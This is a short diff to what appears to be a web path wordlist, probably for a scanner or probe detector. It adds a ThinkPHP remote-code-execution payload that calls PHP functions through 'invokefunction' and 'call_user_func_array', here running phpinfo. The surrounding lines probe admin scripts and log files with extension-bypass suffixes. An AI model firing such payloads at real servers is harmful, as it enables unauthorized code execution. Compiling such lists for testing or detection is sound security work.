@@ -99,3 +99,4 @@
 /OS/startup/restore/restoreAdmin.php
 /tmp/temp.db%3f.1.1.1.1a-1.css
 /mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css
+?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
